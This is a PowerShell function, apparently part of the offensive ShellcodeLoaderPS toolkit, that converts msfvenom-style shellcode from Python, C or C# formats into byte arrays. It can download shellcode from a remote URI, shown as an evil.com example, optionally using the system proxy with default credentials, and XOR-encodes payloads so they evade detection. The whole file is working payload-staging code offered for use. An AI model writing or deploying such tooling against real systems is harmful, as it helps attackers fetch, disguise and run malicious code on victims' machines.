function Format-ByteArray {
#.SYNOPSIS
# PowerShell Script to Convert Multi-Language Shellcode Formats
# Arbitrary Version Number: v1.0.5
# Author: Tyler C. McCann (@tylerdotrar)
#
#.DESCRIPTION
# The purpose of this tool is to allow for convenient shellcode formatting; this tool will take
# shellcode strings formatted for other langauges and convert them into usable byte arrays.
#
# The `-Shellcode` parameter is intentionally undeclared and written to accept most shellcode formats.
# Currently supports [string], [array]/[byte[]], and [uri] types.  If a standard array is used, the
# array will be converted to a string prior to language detection.  If a byte array is used, no 
# formatting will occur.  If a string is determined to be a URI, then a web request will attempt to
# download the raw bytes from the provided URI.
#
# Supported String Formats:
#   o  Path to Raw Shellcode    |  ./shellcode.bin
#   o  URI Hosting Shellcode    |  https://evil.com/files/shellcode.bin
#   o  Python Shellcode Format  |  b"\x45\x78\x61\x6d\x70\x6c\x65"
#   o  C Shellcode Format       |  \x45\x78\x61\x6d\x70\x6c\x65
#   o  C++/C# Shellcode Format  |  {0x45,0x78,0x61,0x70,0x6c,0x65}
#
# Parameters:
#   -Shellcode     -->  Target shellcode blob to convert.
#   -XorKey        -->  XOR cipher key for the shellcode (max value: 0xFF).
#   -UseProxy      -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
#   -FormatC       -->  Return shellcode as a string formatted for C. 
#   -FormatCSharp  -->  Return shellcode as a string formatted for C#/C++.
#   -OutputFile    -->  Output path to write shellcode bytes to.
#   -Help          -->  Return Get-Help information.
#
# Example:
#  _____________________________________________________________________________
# |                                                                             |
# | # Create a variable containing shellcode in a supported language            |
# | PS> $string = <msfvenom_output>                                             |
# |                                                                             |
# | # Convert shellcode string into a PowerShell-usable byte array              |
# | PS> $shellcode = Format-ByteArray -Shellcode $string                        |
# |                                                                             |
# | # XOR encode shellcode bytes and save to a file                             |
# | PS> Format-ByteArray -Shellcode $string -XorKey 0x67 -OutputFile ./evil.bin |
# |_____________________________________________________________________________|
# 
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS
    

    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [UInt32]$XorKey,
        [switch]$UseProxy,
        [switch]$FormatC,
        [switch]$FormatCSharp,
        [string]$OutputFile,
        [switch]$Help
    )


    # Return Get-Help Information
    if ($Help) { return (Get-Help Format-ByteArray) }


    # Minor Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }


    Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow

    # Checking format before parsing
    if ($Shellcode -is [array]) {
            
        # Shellcode is already formatted as a byte array
        if ($Shellcode -is [Byte[]]) {
            Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
            Write-Host ' o  --> No formatting required.'
            $shellcodeBuffer = $Shellcode
        }
        # Convert array to a string for attempted parsing
        else {
            Write-Host ' o  Shellcode parameter is an [array].'
            Write-Host ' o  --> Converting to [string]...'
            $Shellcode = $Shellcode -join ''
        }
    }
    if ($Shellcode -is [uri]) {

        #Write-Host '[!] Formatting Shellcode for Powershell...' -ForegroundColor Yellow
        Write-Host ' o  Shellcode parameter is a [uri].'
        Write-Host " o  --> URI : $($Shellcode.AbsoluteUri)"
        Write-Host ' o  --> Downloading data...'

        Try {
            if ($UseProxy) {

                $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode.AbsoulteUri)
                $WebClient = [System.Net.WebClient]::new()
                $Proxy     = [System.Net.WebProxy]::new()
                $Proxy.Address = $LinkProxy.AbsoluteUri
                $Proxy.UseDefaultCredentials = $TRUE
                $WebClient.Proxy = $Proxy

                $ShellcodeBuffer = $WebClient.DownloadData($Shellcode.AbsoluteUri)
            }
            else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode.AbsoluteUri) }
        }
        Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
    }

    
    # Attempt to determine what language the shellcode is formatted for
    if ($Shellcode -is [String]) {
            
        $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')

        # Check if $Shellcode is a path to a shellcode file
        if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                
            Write-Host ' o  Shellcode [string] is a path to a file.'

            $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
            $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)

            Write-Host " o  --> Path : $ShellcodePath"
            Write-host ' o  --> Reading file bytes...'
        }
        
        # Check if $Shellcode string is a web URL
        elseif ($Shellcode -match "^(http://|https://)") {

            Write-Host ' o  Shellcode [string] is a URI.'
            Write-Host " o  --> URI : $Shellcode"
            Write-Host ' o  --> Downloading data...'
 
            Try {
                if ($UseProxy) {

                    $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode)
                    $WebClient = [System.Net.WebClient]::new()
                    $Proxy     = [System.Net.WebProxy]::new()
                    $Proxy.Address = $LinkProxy.AbsoluteUri
                    $Proxy.UseDefaultCredentials = $TRUE
                    $WebClient.Proxy = $Proxy

                    $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                }
                else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode) }
            } 
            Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
        }

        # Format C or Python formatted shellcode string into PowerShell format
        #   > Python Shellcode Format  :  'b"\x45\x78\x61\x6d\x70\x6c\x65"'
        #   > C Shellcode Format       :  '\x45\x78\x61\x6d\x70\x6c\x65'

        elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                
            #Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow
            Write-Host ' o  Shellcode [string] is formatted for C or Python.'
            Write-Host ' o  --> Formatting for PowerShell...'

            # Convert to PowerShell ASCII array
            $Shellcode       = $Shellcode.Replace(' ','')
            $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]

            # Convert Shellcode ASCII array to Byte Array
            $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
        }

        # Format C++ or C# formatted shellcode string into PowerShell format
        #   > C++ / C# Shellcode Format  :  '{0x45,0x78,0x61,0x70,0x6c,0x65}'

        elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                
            #Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow
            Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
            Write-Host ' o  --> Formatting for PowerShell...'

            # Convert to PowerShell ASCII array
            $Shellcode       = $Shellcode.Replace(' ','')
            $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'

            # Convert Shellcode ASCII array to Byte Array
            $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
        }

        else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
    }

    if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
    Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"


    # XOR Cipher Target Shellcode
    if ($XorKey) {
        Write-Host '[!] Applying XOR Cipher to Shellcode...' -ForegroundColor Yellow
        Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"

        for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
            $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
        }
    }


    # Return byte array formatted for C
    if ($FormatC) {
        Write-Host '[!] Returning bytes formatted for C:' -ForegroundColor Yellow
        $lines = for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i += 16) {
            $slice = $ShellcodeBuffer[$i..([Math]::Min($i+15, $ShellcodeBuffer.Length-1))]
            "    `"" + (($slice | ForEach-Object { "\x{0:X2}" -f $_ }) -join "")
        }
        $FormattedBytes = "unsigned char buf[] = `n" + ($lines -join "`"`n") + "`";"
        return $FormattedBytes
    }
    

    # Return byte array formatted for C#
    if ($FormatCSharp) {
        Write-Host '[!] Returning bytes formatted for C#/C++:' -ForegroundColor Yellow
        $lines = for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i += 16) {
            $slice = $ShellcodeBuffer[$i..([Math]::Min($i+15, $ShellcodeBuffer.Length-1))]
            "    " + (($slice | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", ")
        }
        $FormattedBytes = "byte[] data = new byte[] {`n" + ($lines -join ",`n") + "`n};"
        return $FormattedBytes
    }
    
    
    # Save Bytes to an Output File
    if ($OutputFile) {
        if (!($OutputFile -like "*:*")) { $OutputFile = "${PWD}\${OutputFile}" } 
        Write-Host '[!] Saving shellcode to output file:' -ForegroundColor Yellow
        Write-Host " o  --> Output File : ${OutputFile}"
        [System.IO.File]::WriteAllBytes($OutputFile, $ShellcodeBuffer)
        return
    }


    # Return Formatted Byte Array 
    return ,$shellcodeBuffer
}